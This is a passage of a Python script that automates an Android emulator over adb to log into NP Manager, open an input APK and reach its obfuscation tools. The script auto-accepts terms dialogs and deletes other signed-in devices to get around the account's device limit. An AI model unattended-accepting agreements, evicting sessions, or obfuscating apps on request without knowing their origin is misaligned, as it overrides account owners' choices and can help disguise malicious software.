    adb(f"pull /sdcard/screen_{name}.png {path}")
    print(f"[SCREEN] {name}")

def get_screen():
    size = adb("shell wm size").stdout.strip()
    m = re.search(r'(\d+)x(\d+)', size)
    return (int(m.group(1)), int(m.group(2))) if m else (1080, 1920)

def get_xml(save_as=None):
    adb("shell uiautomator dump /sdcard/window_dump.xml")
    r = adb("shell cat /sdcard/window_dump.xml")
    xml = r.stdout
    if save_as:
        path = os.path.join(SCREENSHOT_DIR, f"{save_as}.xml")
        os.makedirs(SCREENSHOT_DIR, exist_ok=True)
        with open(path, "w") as f:
            f.write(xml)
        # Also print first 2000 chars so it shows in GH Actions logs
        print(f"[XML:{save_as}] {xml[:2000]}")
    return xml

def find_text(xml, text):
    pat = re.compile(r'<node[^>]*text="' + re.escape(text) + r'"[^>]*bounds="\[(\d+),(\d+)\]\[(\d+),(\d+)\]"')
    m = pat.search(xml)
    if m:
        x1, y1, x2, y2 = map(int, m.groups())
        return ((x1+x2)//2, (y1+y2)//2)
    return None

def tap_text(xml, text, desc=""):
    c = find_text(xml, text)
    if c:
        adb(f"shell input tap {c[0]} {c[1]}")
        print(f"[*] Tap {desc or text} @ {c}")
        return True
    return False

def tap_rel(rx, ry, desc=""):
    w, h = get_screen()
    x, y = int(w*rx), int(h*ry)
    adb(f"shell input tap {x} {y}")
    print(f"[*] Tap {desc} @ ({x},{y})")
    return True

def scroll_rel(x1, y1, x2, y2, dur=500):
    w, h = get_screen()
    adb(f"shell input swipe {int(w*x1)} {int(h*y1)} {int(w*x2)} {int(h*y2)} {dur}")

def back():
    adb("shell input keyevent 4")
    time.sleep(0.5)

def wait_for_boot(max_wait=120):
    print("[*] Waiting for emulator...")
    for i in range(max_wait//2):
        r = adb("shell getprop sys.boot_completed", timeout=5)
        if "1" in r.stdout:
            print("[+] Booted")
            time.sleep(3)
            return True
        time.sleep(2)
    return False

def install_apk(apk_path, pkg):
    if not os.path.exists(os.path.expanduser(apk_path)):
        print(f"[!] APK not found: {apk_path}")
        return False
    print(f"[*] Installing {pkg}...")
    r = adb(f"install -r -d '{os.path.expanduser(apk_path)}'", timeout=60)
    print(f"    {r.stdout[:100]} {r.stderr[:100]}")
    return "Success" in r.stdout or pkg in adb("shell pm list packages").stdout

def dismiss_all_dialogs(max_attempts=10):
    """Dismiss any dialog/popup blocking the main UI: terms, update notice, announcement, ANR, etc."""
    for i in range(max_attempts):
        xml = get_xml()
        dismissed = False

        # System ANR dialogs: "isn't responding"
        # For Pixel Launcher: tap "Close app" (we don't need it, and "Wait" keeps ANR alive forever)
        # For NP Manager: tap "Wait" to keep it alive
        if "isn't responding" in xml or "not responding" in xml.lower():
            print(f"[*] ANR dialog detected (attempt {i+1})")
            anr_title = next((t for t,x,y in find_any_bounds(xml) if "isn't responding" in t or "not responding" in t.lower()), "")
            print(f"[ANR_TITLE] {anr_title[:60]}")
            if "pixel launcher" in anr_title.lower() or ("launcher" in anr_title.lower() and "np" not in anr_title.lower()):
                print("[ANR] Pixel Launcher — closing it")
                if tap_text(xml, "Close app", "ANR: Close Pixel Launcher"):
                    time.sleep(2)
                    dismissed = True
                else:
                    adb("shell input keyevent 4")
                    time.sleep(1)
                    dismissed = True
            else:
                if tap_text(xml, "Wait", "ANR: Wait"):
                    time.sleep(2)
                    dismissed = True
                elif tap_text(xml, "Close app", "ANR: Close app"):
                    time.sleep(2)
                    dismissed = True
                else:
                    adb("shell input keyevent 4")
                    time.sleep(1)
                    dismissed = True

        if not dismissed:
            # Update dialog: "WAIT UNTIL LATER" / "UPDATE IMMEDIATELY" / "COPY URL"
            for btn in ["WAIT UNTIL LATER", "Later", "Cancel", "CANCEL", "Skip", "SKIP",
                        "Close", "CLOSE", "No Thanks", "Dismiss"]:
                if tap_text(xml, btn, f"Dialog dismiss: {btn}"):
                    time.sleep(1.5)
                    dismissed = True
                    break

        if not dismissed:
            # Terms / agreement dialogs
            has_terms = any(kw in xml for kw in [
                "\u7528\u6237\u534f\u8bae", "Notice", "Terms", "\u540c\u610f",
                "\u5173\u4e8eAPP", "\u6350\u8d60", "parentPanel"
            ])
            if has_terms:
                print(f"[*] Dialog/terms (attempt {i+1})")
                if i == 0:
                    for _ in range(3):
                        scroll_rel(0.5, 0.70, 0.5, 0.30, 500)
                        time.sleep(0.2)
                (
                    tap_text(xml, "\u540c\u610f", "AGREE") or
                    tap_text(xml, "Agree", "AGREE") or
                    tap_text(xml, "AGREE", "AGREE") or
                    tap_text(xml, "Yes", "Yes") or
                    tap_text(xml, "OK", "OK") or
                    tap_rel(0.82, 0.97, "AGREE fallback")
                )
                time.sleep(1.5)
                dismissed = True

        if not dismissed:
            # No more dialogs
            return True

    print("[!] Dialogs stuck after max attempts")
    return False

def dismiss_terms(max_attempts=6):
    """Legacy alias — calls dismiss_all_dialogs."""
    return dismiss_all_dialogs(max_attempts)

def launch_npm():
    print(f"[*] Launching {NP_PACKAGE}...")
    adb(f"shell am force-stop {NP_PACKAGE}")
    time.sleep(0.5)
    adb(f"shell monkey -p {NP_PACKAGE} -c android.intent.category.LAUNCHER 1")
    time.sleep(4)
    screenshot("launch_np")

def handle_login():
    print("[*] Login flow...")
    dismiss_terms()

    xml = get_xml()
    if "Projects" in xml or "Tools" in xml or "Settings" in xml:
        print("[+] Already logged in")
        return True

    # Tap hamburger menu (3 lines, top-left)
    print("[*] Tapping hamburger (3 lines)...")
    tap_rel(0.08, 0.06, "Hamburger")
    time.sleep(2)
    screenshot("menu_opened")

    xml = get_xml()
    # Look for Sign In / Login / Account
    sign_items = ["Sign In", "Signin", "Login", "Log In", "\u767b\u5f55", "\u767b\u5165", "Account"]
    for item in sign_items:
        if tap_text(xml, item, f"Menu: {item}"):
            break
    else:
        tap_rel(0.25, 0.65, "Menu fallback")

    time.sleep(3)
    screenshot("signin_screen")
    dismiss_terms()

    # Handle pre-connection: remove second device
    xml = get_xml()
    if "pre-connection" in xml.lower() or "connected" in xml.lower() or "Second" in xml or "\u8bbe\u5907" in xml:
        print("[*] Pre-connection detected! Removing second device...")
        remove_items = ["Remove", "Disconnect", "Delete", "\u79fb\u9664", "\u5220\u9664", "\u65ad\u5f00"]
        for item in remove_items:
            if tap_text(xml, item, f"Remove: {item}"):
                time.sleep(2)
                break
        else:
            tap_rel(0.75, 0.45, "Remove device fallback")
            time.sleep(1)
            # Confirm
            confirm_items = ["Yes", "OK", "Confirm", "\u786e\u5b9a", "\u662f"]
            xml2 = get_xml()
            for item in confirm_items:
                if tap_text(xml2, item, f"Confirm: {item}"):
                    break
        time.sleep(3)
        screenshot("after_remove")

        # NOW: re-login with same procedure
        print("[*] Re-logging in after device removal...")
        # Tap hamburger again
        tap_rel(0.08, 0.06, "Hamburger (re-login)")
        time.sleep(2)
        xml = get_xml()
        for item in sign_items:
            if tap_text(xml, item, f"Re-login: {item}"):
                break
        time.sleep(3)
        screenshot("relogin_screen")
        dismiss_terms()

    # Enter email
    print("[*] Entering credentials...")
    xml = get_xml()
    email_field = find_text(xml, "Email") or find_text(xml, "\u90ae\u7bb1") or find_text(xml, "E-mail")
    if not email_field:
        w, h = get_screen()
        email_field = (w//2, int(h*0.38))
    adb(f"shell input tap {email_field[0]} {email_field[1]}")
    time.sleep(0.5)
    adb(f'shell input text "{EMAIL}"')
    print(f"[*] Email: {EMAIL[:5]}...")
    time.sleep(0.5)

    # Enter password (below email)
    pass_field = (email_field[0], email_field[1] + 100)
    adb(f"shell input tap {pass_field[0]} {pass_field[1]}")
    time.sleep(0.5)
    adb(f'shell input text "{PASSWORD}"')
    print("[*] Password entered")
    time.sleep(0.5)

    # Tap login button
    xml = get_xml()
    login_btn = (
        find_text(xml, "Login") or find_text(xml, "Log In") or
        find_text(xml, "Sign In") or find_text(xml, "\u767b\u5f55") or
        find_text(xml, "\u767b\u5165") or find_text(xml, "\u786e\u5b9a")
    )
    if not login_btn:
        w, h = get_screen()
        login_btn = (w//2, int(h*0.58))
    adb(f"shell input tap {login_btn[0]} {login_btn[1]}")
    print(f"[*] Login tapped @ {login_btn}")
    time.sleep(6)
    screenshot("after_login")
    dismiss_terms()

    xml = get_xml()
    if "Email" in xml or "\u90ae\u7bb1" in xml or "Password" in xml:
        print("[!] Still on login screen")
        return False
    print("[+] Login done")
    return True

# Keywords that ONLY appear in the project editor (not the file browser or dialogs)
PROJECT_KEYWORDS = [
    "Smali", "smali",           # Smali editor tab
    "AndroidManifest",          # Manifest editor
    "classes.dex",              # Dex file
    "META-INF",                 # Project tree
    "res/",                     # Project tree
]

# Keywords from the NP Manager FUNCTION tools menu — this is also a "loaded" state
NP_TOOLS_KEYWORDS = [
    "SUPER OBFUSCATION",
    "CONTROL FLOW OBFUSCATION",
    "APK VM PROTECTION",
    "RES CONFUSION",
    "DEX STRING DECRYPTION",
    "AGAINST DEX CONFUSION",
    "CHANGE PACKAGE NAME OR CLASS NAME",
    "ONE-CLICK RANDOMLY SIGN APK",
    "OBFUSCATE APK",
    "DEX OBFUSCATION DICTIONARY EXTRACTION",
]

def is_project_loaded(xml):
    # Check classic project editor signals
    matches = [kw for kw in PROJECT_KEYWORDS if kw in xml]
    if len(matches) >= 2:
        return True
    # Also accept: NP Manager FUNCTION tools menu (we're in with the APK loaded)
    tools_matches = [kw for kw in NP_TOOLS_KEYWORDS if kw in xml]
    if len(tools_matches) >= 2:
        return True
    return False

def find_any_bounds(xml):
    """Return all (text, cx, cy) tuples from clickable nodes."""
    results = []
    for m in re.finditer(r'<node[^>]*text="([^"]*)"[^>]*bounds="\[(\d+),(\d+)\]\[(\d+),(\d+)\]"', xml):
        txt = m.group(1)
        cx = (int(m.group(2)) + int(m.group(4))) // 2
        cy = (int(m.group(3)) + int(m.group(5))) // 2
        results.append((txt, cx, cy))
    return results

def clear_text_field_and_type(field_x, field_y, new_text):
    """Clear an Android text field and type new text.
    
    Strategy: tap to focus, select all (CTRL+A), delete, then type.
    Also sends many DEL keycodes as a belt-and-suspenders approach.
    """
    # Focus the field
    adb(f"shell input tap {field_x} {field_y}")
    time.sleep(0.5)
    # Select all text in the field
    adb("shell input keyevent KEYCODE_CTRL_A")
    time.sleep(0.2)
    # Delete selected text
    adb("shell input keyevent KEYCODE_DEL")
    time.sleep(0.2)
    # Also move to end and send many DEL as fallback (in case CTRL+A didn't work)
    adb("shell input keyevent KEYCODE_MOVE_END")
    time.sleep(0.2)
    del_events = " ".join(["KEYCODE_DEL"] * 80)
    adb(f"shell input keyevent {del_events}")
    time.sleep(0.3)
    # Now type new text
    adb(f"shell input text '{new_text}'")
    time.sleep(0.5)
    print(f"[FIELD] Cleared and typed: {new_text}")


def nav_to_path_in_browser(target_path):
    """Use NP Manager's 'Jump to Path' dialog to navigate directly to a folder.
    
    Workflow:
    1. Tap path bar (shows /storage/emulated/0) -> opens 'Jump to Path' dialog
    2. Dialog has: title, text field with current path, CANCEL, CONFIRM buttons
    3. Clear the text field completely, type new path, tap CONFIRM at pre-captured coords
    """
    xml = get_xml()
    nodes = find_any_bounds(xml)
    # Find path bar node — shows /storage/emulated/0
    path_node = next(((cx, cy) for txt, cx, cy in nodes if "/storage" in txt or ("/sdcard" in txt and "Android" not in txt)), None)
    if not path_node:
        print(f"[NAV] No path bar. Nodes: {[t for t,x,y in nodes if t.strip()][:10]}")
        return False

    adb(f"shell input tap {path_node[0]} {path_node[1]}")
    time.sleep(1.5)

    # Read the dialog that just opened
    xml2 = get_xml()
    nodes2 = find_any_bounds(xml2)
    print(f"[NAV_DIALOG] {[n for n in nodes2 if n[0].strip()]}")

    if "Jump to Path" not in xml2:
        print("[NAV] 'Jump to Path' dialog not found")
        return False

    # Capture CONFIRM button position BEFORE typing (keyboard may shift it)
    confirm_pos = next(((cx, cy) for txt, cx, cy in nodes2 if txt == "CONFIRM"), None)
    print(f"[NAV_CONFIRM_POS] {confirm_pos}")

    # Find the text field in the dialog
    path_field_pos = next(((cx, cy) for txt, cx, cy in nodes2 if "/storage" in txt or "/sdcard" in txt), None)
    if not path_field_pos:
        print("[NAV] No path field found in dialog")
        return False

    # Clear field and type target path
    clear_text_field_and_type(path_field_pos[0], path_field_pos[1], target_path)

    # Read the field content after typing to verify
    xml_check = get_xml()
    nodes_check = find_any_bounds(xml_check)
    field_now = next((t for t,x,y in nodes_check if "/sdcard" in t or "/storage" in t or "Android" in t), "?")
    print(f"[NAV_FIELD_AFTER_TYPE] '{field_now}'")

    # CRITICAL: Dismiss the soft keyboard BEFORE tapping CONFIRM
    # The keyboard appears after typing and covers the dialog buttons at y=1360.
    # Press Back to hide keyboard without closing the dialog.
    adb("shell input keyevent KEYCODE_BACK")
    time.sleep(0.8)

    # Re-read XML to get CONFIRM coords after keyboard dismissal
    xml_nodialog = get_xml()
    nodes_nodialog = find_any_bounds(xml_nodialog)
    print(f"[NAV_AFTER_KB_DISMISS] {[n for n in nodes_nodialog if n[0].strip()][:8]}")
    confirm_pos2 = next(((cx, cy) for txt, cx, cy in nodes_nodialog if txt == "CONFIRM"), confirm_pos)
    print(f"[NAV_CONFIRM_POS2] {confirm_pos2}")

    # Tap CONFIRM
    if confirm_pos2:
        adb(f"shell input tap {confirm_pos2[0]} {confirm_pos2[1]}")
        print(f"[NAV] Tapped CONFIRM @ {confirm_pos2}")
        time.sleep(2)
    else:
        adb("shell input keyevent 66")
        print("[NAV] Pressed Enter (no CONFIRM found)")
        time.sleep(2)

    # Check where we ended up
    xml3 = get_xml()
    nodes3 = find_any_bounds(xml3)
    curr = next((t for t,x,y in nodes3 if "/storage" in t or "/sdcard" in t), "unknown")
    print(f"[NAV_RESULT] Now at: {curr}")
    return "files" in curr or target_path in curr


def open_apk():
    print("[*] Opening APK via NP Manager...")
    if not os.path.exists(os.path.expanduser(INPUT_APK)):
        print("[!] Input APK missing")
        return False

    # Push APK to a location NP Manager can access via Intent
    DL_DIR = "/sdcard/Download"
    NP_FILES_DIR = f"/sdcard/Android/data/{NP_PACKAGE}/files"
    adb(f"shell mkdir -p {NP_FILES_DIR}")

    # Push to NP's own app-private dir (it can always read its own files dir)
    r_push = adb(f"push '{INPUT_APK}' {NP_FILES_DIR}/input.apk")
    print(f"[PUSH_NP] {r_push.stdout.strip()[:150]} {r_push.stderr.strip()[:150]}")

    # Also push to Download
    r_push_dl = adb(f"push '{INPUT_APK}' {DL_DIR}/input.apk")
    print(f"[PUSH_DL] {r_push_dl.stdout.strip()[:150]} {r_push_dl.stderr.strip()[:150]}")

    time.sleep(1)
    r_ls = adb(f"shell ls -la {NP_FILES_DIR}/ {DL_DIR}/ 2>&1")
    print(f"[LS_BOTH] {r_ls.stdout.strip()[:600]}")

    # Grant MANAGE_EXTERNAL_STORAGE so NP Manager's file browser can see all files
    r_grant = adb(f"shell appops set {NP_PACKAGE} MANAGE_EXTERNAL_STORAGE allow")
    print(f"[GRANT_STORAGE] rc={r_grant.returncode} {r_grant.stderr.strip()[:100]}")

    # STRATEGY: Send a VIEW Intent directly to NP Manager with the APK file URI.
    # This bypasses the file browser entirely and directly opens the APK as a project.
    # NP Manager handles android.intent.action.VIEW with application/vnd.android.package-archive.
    APK_ON_DEVICE = f"{NP_FILES_DIR}/input.apk"
    print(f"[*] Sending VIEW Intent for {APK_ON_DEVICE}...")

    # Method 1: am start with file:// URI (NP Manager's own files dir)
    r_intent = adb(
        f"shell am start -n {NP_PACKAGE}/.activity.NPMainActivity"
        f" -a android.intent.action.VIEW"
        f" -t application/vnd.android.package-archive"
        f" -d file://{APK_ON_DEVICE}"
        f" --grant-read-uri-permission"
    )
    print(f"[INTENT_RESULT] {r_intent.stdout.strip()[:200]} {r_intent.stderr.strip()[:100]}")
    time.sleep(5)

    screenshot("after_intent")
    xml = get_xml(save_as="01_after_intent")
    nodes_intent = find_any_bounds(xml)
    print(f"[NODES_INTENT] {[n for n in nodes_intent if n[0].strip()][:15]}")

    if is_project_loaded(xml):
        print("[+] Project loaded via Intent!")
        return True

    # Method 2: Try ApkInstallerActivity which NP Manager uses for its file picker
    r_intent2 = adb(
        f"shell am start -n {NP_PACKAGE}/.activity.ApkInstallerActivity"
        f" -a android.intent.action.VIEW"
        f" -t application/vnd.android.package-archive"
        f" -d file://{APK_ON_DEVICE}"
        f" --grant-read-uri-permission"
    )
    print(f"[INTENT2_RESULT] {r_intent2.stdout.strip()[:200]}")
    time.sleep(5)

    screenshot("after_intent2")
    xml = get_xml(save_as="01b_after_intent2")
    nodes2 = find_any_bounds(xml)
    print(f"[NODES_INTENT2] {[n for n in nodes2 if n[0].strip()][:15]}")

    if is_project_loaded(xml):
        print("[+] Project loaded via Intent2!")
        return True

    # Method 3: Dismiss dialogs and use the file browser to navigate
    # Re-launch NP Manager fresh
    adb(f"shell am force-stop {NP_PACKAGE}")
    time.sleep(2)
    adb(f"shell monkey -p {NP_PACKAGE} -c android.intent.category.LAUNCHER 1")
    time.sleep(8)

    # Aggressively clear ALL ANR/dialogs — System UI / Pixel Launcher ANR can persist
    # For Pixel Launcher ANR: tap "Close app" (kills it cleanly; we don't need it).
    # For NP Manager ANR: tap "Wait" to keep it alive.
    for _ in range(15):
        xml_anr = get_xml()
        if "isn't responding" in xml_anr or "not responding" in xml_anr.lower():
            nodes_anr = find_any_bounds(xml_anr)
            # Determine which app is ANR-ing
            anr_title = next((t for t,x,y in nodes_anr if "isn't responding" in t or "not responding" in t.lower()), "")
            if "pixel launcher" in anr_title.lower() or "launcher" in anr_title.lower():
                # Kill Pixel Launcher — we don't need it
                tap_text(xml_anr, "Close app", "Pixel Launcher ANR close")
                print(f"[ANR] Closed Pixel Launcher")
            else:
                tap_text(xml_anr, "Wait", "ANR aggressive dismiss")
            time.sleep(2)
        else:
            break

    # Dismiss ALL dialogs
    dismiss_all_dialogs(max_attempts=15)
    time.sleep(2)

    screenshot("np_main_screen")
    xml = get_xml(save_as="02_main_screen")
    nodes_main = find_any_bounds(xml)
    print(f"[NODES_MAIN] {[n for n in nodes_main if n[0].strip()][:15]}")

    # Navigate to NP files dir — retry up to 3 times in case ANR blocks dialog
    nav_ok = False
    for nav_attempt in range(3):
        # Clear any lingering ANRs before each attempt
        # For Pixel Launcher ANR: close it; for NP Manager ANR: wait
        for _ in range(8):
            xml_chk = get_xml()
            if "isn't responding" in xml_chk or "not responding" in xml_chk.lower():
                nodes_chk = find_any_bounds(xml_chk)
                anr_title_chk = next((t for t,x,y in nodes_chk if "isn't responding" in t or "not responding" in t.lower()), "")
                if "pixel launcher" in anr_title_chk.lower() or "launcher" in anr_title_chk.lower():
                    tap_text(xml_chk, "Close app", f"Pixel Launcher ANR pre-nav {nav_attempt}")
                    print(f"[ANR] Closed Pixel Launcher pre-nav")
                else:
                    tap_text(xml_chk, "Wait", f"ANR pre-nav attempt {nav_attempt}")
                time.sleep(2)
            else:
                break
        print(f"[*] Navigating to NP files dir (attempt {nav_attempt+1})...")
        nav_ok = nav_to_path_in_browser(NP_FILES_DIR)
        time.sleep(3)
        # Verify we actually navigated
        xml_nav = get_xml()
        nodes_nav = find_any_bounds(xml_nav)
        curr = next((t for t,x,y in nodes_nav if NP_FILES_DIR in t or "com.wn.app.np" in t), None)
        if curr:
            print(f"[NAV_SUCCESS] At {curr} on attempt {nav_attempt+1}")
            break
        print(f"[NAV_RETRY] Still not at NP files dir after attempt {nav_attempt+1}, retrying...")
        time.sleep(3)

    screenshot("inside_np_files")
    xml = get_xml(save_as="03_np_files_contents")
    nodes_f = find_any_bounds(xml)
    visible = [n for n in nodes_f if n[0].strip()]
    print(f"[NODES_NP_FILES] {visible}")

    if is_project_loaded(xml):
        print("[+] Project editor already showing!")
        return True

    # Check where we ended up after navigation
    curr_path = next((t for t,x,y in visible if "/storage" in t or "/sdcard" in t), "unknown")
    print(f"[CURR_PATH] {curr_path}")

    # Tap input.apk if visible
    apk_tapped = False
    for txt, cx, cy in nodes_f:
        if "input" in txt.lower() and ".apk" in txt.lower():
            adb(f"shell input tap {cx} {cy}")
            print(f"[*] Tapped APK '{txt}' @ ({cx},{cy})")
            apk_tapped = True
            time.sleep(3)
            break

    if not apk_tapped:
        # Also accept bare "input" filename
        for txt, cx, cy in nodes_f:
            if txt.strip().lower() == "input.apk" or (txt.strip().lower().startswith("input") and ".apk" in txt.lower()):
                adb(f"shell input tap {cx} {cy}")
                print(f"[*] Tapped APK fallback '{txt}' @ ({cx},{cy})")
                apk_tapped = True
                time.sleep(3)
                break

    if not apk_tapped:
        print(f"[!] input.apk not visible in NP files dir.")
        r_ls2 = adb(f"shell ls -la {NP_FILES_DIR}/ /sdcard/Download/ 2>&1")
        print(f"[LS_CHECK] {r_ls2.stdout.strip()[:400]}")
    else:
        # After tapping input.apk, NP Manager may show a context/action dialog.
        # Print ALL nodes so we know exactly what to tap.
        xml3 = get_xml(save_as="04_after_apk_tap")
        nodes3 = find_any_bounds(xml3)
        print(f"[NODES_AFTER_TAP] {[n for n in nodes3 if n[0].strip()]}")
        if is_project_loaded(xml3):
            print("[+] Project editor opened immediately!")
            return True
        # NP Manager shows an APK info screen with FUNCTION / VIEW / INSTALL buttons.
        # FUNCTION = opens the project editor / tools menu — tap it first.
        tapped_dialog = False
        for kw in ["FUNCTION", "功能", "Decompile", "decompile", "反编译", "Open project",
                   "Project", "Editor", "OK", "确定", "Open", "Start", "开始", "Import", "导入"]:
            if tap_text(xml3, kw, f"APK info: {kw}"):
                tapped_dialog = True
                time.sleep(5)
                break
        if not tapped_dialog:
            print(f"[!] No known dialog option found after tap. Will wait for editor...")

    # Step 3: Wait for project editor/decompile UI to load (up to 120s)
    # NP Manager decompiles the APK which takes 20-60s on the emulator.
    # IMPORTANT: Tapping FUNCTION may kick back to the login screen (session re-check).
    # Detect this and re-login, then we'll end up in the FUNCTION/tools view.
    print("[*] Waiting for project editor...")
    relogin_done = False
    for i in range(60):
        time.sleep(2)
        xml = get_xml()
        # Dismiss any ANR that reappears
        if "isn't responding" in xml or "not responding" in xml.lower():
            nodes_anr_w = find_any_bounds(xml)
            anr_title_w = next((t for t,x,y in nodes_anr_w if "isn't responding" in t or "not responding" in t.lower()), "")
            if "pixel launcher" in anr_title_w.lower() or "launcher" in anr_title_w.lower():
                tap_text(xml, "Close app", "Pixel Launcher ANR wait loop")
                print("[ANR] Closed Pixel Launcher in wait loop")
            else:
                tap_text(xml, "Wait", "ANR Wait loop")
            time.sleep(1)
            continue
        if is_project_loaded(xml):
            print(f"[+] Project loaded! ({i*2}s)")
            return True
        nodes_w = find_any_bounds(xml)
        visible = [n for n in nodes_w if n[0].strip()]
        texts = [t for t,x,y in visible]
        if i % 5 == 0:
            print(f"[WAIT_{i*2}s] {visible[:12]}")

        # Detect the "Delete a signed-in device" / "DOUBLE-ENDED LOGIN" dialog
        # shown after re-login when the account has too many devices logged in.
        # Tap DELETE on the FIRST listed device to free up a slot.
        # After DELETE, NP Manager returns to the login screen with credentials pre-filled —
        # just tap LOGIN again (no need to re-enter credentials).
        if any("double-ended login" in t.lower() or "delete a signed-in device" in t.lower() for t,x,y in visible):
            print("[*] DOUBLE-ENDED LOGIN dialog — deleting oldest device slot...")
            # Tap the first DELETE button (oldest device = first in list)
            for t, x, y in visible:
                if t.strip().upper() == "DELETE":
                    adb(f"shell input tap {x} {y}")
                    print(f"[*] Tapped DELETE @ ({x},{y})")
                    time.sleep(4)
                    break
            # After DELETE, dismiss any confirmation dialog ("OK", "确定", etc.)
            xml_dd = get_xml()
            nodes_dd = find_any_bounds(xml_dd)
            print(f"[AFTER_DELETE] {[n for n in nodes_dd if n[0].strip()][:8]}")
            for kw in ["OK", "确定", "CONFIRM", "Yes"]:
                if tap_text(xml_dd, kw, f"Delete confirm: {kw}"):
                    time.sleep(2)
                    xml_dd = get_xml()
                    nodes_dd = find_any_bounds(xml_dd)
                    break
            screenshot("after_delete_device")
            # NP Manager returns to login screen with credentials already filled.
            # Detect this and tap LOGIN immediately.
            texts_dd = [t for t,x,y in nodes_dd if t.strip()]
            if "LOGIN" in texts_dd and any("@" in t or "••" in t for t,x,y in nodes_dd):
                print("[*] Back on login screen after DELETE — tapping LOGIN (creds pre-filled)...")
                for t2, x2, y2 in nodes_dd:
                    if t2.strip() == "LOGIN":
                        adb(f"shell input tap {x2} {y2}")
                        print(f"[RELOGIN2_LOGIN] tapped @ ({x2},{y2})")
                        time.sleep(8)
                        break
                else:
                    # Fallback: tap at known LOGIN position
                    adb("shell input tap 540 1302")
                    print("[RELOGIN2_LOGIN] fallback tap @ (540,1302)")
                    time.sleep(8)
                relogin_done = True
            continue

        # Detect login screen shown by FUNCTION's session check and re-login
        if not relogin_done and ("LOGIN" in texts or "login" in texts) and "Please enter" in " ".join(texts):
            print("[*] FUNCTION triggered login re-check — re-logging in...")
            # The re-login screen may show placeholder hints OR pre-filled content.
            # Strategy: find email field by placeholder OR by "@" in text, then
            # use clear_text_field_and_type (which does CTRL+A + 80xDEL) to wipe it.
            all_nodes = find_any_bounds(xml)
            # Identify email field: placeholder text or a node containing "@"
            email_node = None
            for t, x, y in all_nodes:
                if "account number" in t.lower() or "email address" in t.lower() or "@" in t:
                    email_node = (x, y)
                    print(f"[RELOGIN_EMAIL_FIELD] found at ({x},{y}): {t[:40]}")
                    break
            # Identify password field: placeholder "Please enter a password" (not "Forgot password")
            pass_node = None
            for t, x, y in all_nodes:
                if "please enter a password" in t.lower():
                    pass_node = (x, y)
                    print(f"[RELOGIN_PASS_FIELD] found at ({x},{y}): {t[:40]}")
                    break
            if not pass_node:
                # Fallback: any "password" node that's not "Forgot"
                for t, x, y in all_nodes:
                    if "password" in t.lower() and "forgot" not in t.lower() and x > 400:
                        pass_node = (x, y)
                        print(f"[RELOGIN_PASS_FIELD] fallback at ({x},{y}): {t[:40]}")
                        break
            # Identify LOGIN button — must be exactly "LOGIN" (uppercase, not title "login")
            login_node = None
            for t, x, y in all_nodes:
                if t.strip() == "LOGIN":  # exact uppercase match — not the title "login"
                    login_node = (x, y)
                    break
            if not login_node:
                # fallback: any node whose text is all caps LOGIN
                for t, x, y in all_nodes:
                    if t.strip().upper() == "LOGIN" and t.strip() != "login":
                        login_node = (x, y)
                        break
            print(f"[RELOGIN_LOGIN_NODE] {login_node}")
            # Clear and fill email
            ex, ey = email_node if email_node else (540, 936)
            clear_text_field_and_type(ex, ey, EMAIL)
            time.sleep(1.5)
            # Dismiss keyboard before tapping password field
            adb("shell input keyevent KEYCODE_BACK")
            time.sleep(0.5)
            # Verify email field and show intermediate state
            xml_mid = get_xml()
            nodes_mid = find_any_bounds(xml_mid)
            print(f"[RELOGIN_MID] {[n for n in nodes_mid if n[0].strip()][:8]}")
            # Re-find password field in fresh XML (positions may shift)
            for t2, x2, y2 in nodes_mid:
                if "please enter a password" in t2.lower():
                    pass_node = (x2, y2)
                    print(f"[RELOGIN_PASS_REFOUND] ({x2},{y2}): {t2[:30]}")
                    break
            # Clear and fill password
            px, py = pass_node if pass_node else (540, 1096)
            clear_text_field_and_type(px, py, PASSWORD)
            time.sleep(1.5)
            # Dismiss keyboard
            adb("shell input keyevent KEYCODE_BACK")
            time.sleep(0.5)
            # Re-read XML to find LOGIN button in final state
            xml_final = get_xml()
            nodes_final2 = find_any_bounds(xml_final)
            print(f"[RELOGIN_BEFORE_LOGIN] {[n for n in nodes_final2 if n[0].strip()][:10]}")
            # Tap LOGIN
            lx, ly = login_node if login_node else (540, 1302)
            print(f"[RELOGIN_LOGIN_BTN] tapping LOGIN @ ({lx},{ly})")
            adb(f"shell input tap {lx} {ly}")
            time.sleep(8)
            relogin_done = True
            screenshot("after_relogin")
            xml = get_xml(save_as="relogin_state")
            nodes_rl = find_any_bounds(xml)
            print(f"[RELOGIN_STATE] {[n for n in nodes_rl if n[0].strip()][:12]}")
            continue

        # Tap any decompile/open action dialog that appears mid-wait
        for kw in ["Decompile", "decompile", "反编译", "OK", "确定", "Open", "Continue", "开始", "Start"]:
            if any(t.strip() == kw for t, x, y in visible):
                tap_text(xml, kw, f"Dialog mid-wait: {kw}")
                time.sleep(3)
                break

        # Detect that we're still on the root file browser (nav failed due to ANR earlier).
        # ANR may have cleared by now — retry nav + APK tap from here.
        curr_paths = [t for t,x,y in visible if "/storage/emulated/0" == t or t == "/storage/emulated/0"]
        apk_visible = any("input" in t.lower() and ".apk" in t.lower() for t,x,y in visible)
        func_visible = any(t.strip() == "FUNCTION" for t,x,y in visible)
        if curr_paths and not apk_visible and not func_visible and i > 0 and i % 10 == 0:
            print(f"[WAIT_RENAVIGATING] Still at root browser, retry nav at {i*2}s...")
            nav_to_path_in_browser(NP_FILES_DIR)
            time.sleep(3)
            xml2 = get_xml()
            nodes2 = find_any_bounds(xml2)
            for txt2, cx2, cy2 in nodes2:
                if "input" in txt2.lower() and ".apk" in txt2.lower():
                    adb(f"shell input tap {cx2} {cy2}")
                    print(f"[WAIT_TAPPED_APK] '{txt2}' @ ({cx2},{cy2})")
                    time.sleep(4)
                    xml3 = get_xml()
                    for kw in ["FUNCTION", "Decompile", "OK"]:
                        if tap_text(xml3, kw, f"Post-renav: {kw}"):
                            time.sleep(4)
                            break
                    break

    print("[!] Project load timeout")
    screenshot("load_timeout")
    xml = get_xml(save_as="07_timeout")
    nodes_final = find_any_bounds(xml)
    print(f"[TIMEOUT_NODES] {[n for n in nodes_final if n[0].strip()][:30]}")
    return False

def find_tool_on_screen(tool_name, xml):
    """Find a tool by exact text match in the XML. Returns (x, y) or None."""
    nodes = find_any_bounds(xml)
    for t, x, y in nodes:
        if t.strip() == tool_name:
            return (x, y)
    return None

def scroll_tool_list_and_tap(tool_name):
    """Scroll the tools list to find and tap a tool. Returns True if tapped."""
    # Try visible screen first
    xml = get_xml()
    pos = find_tool_on_screen(tool_name, xml)
    if pos:
        adb(f"shell input tap {pos[0]} {pos[1]}")
        print(f"[TOOL_TAP] '{tool_name}' @ {pos}")
        return True
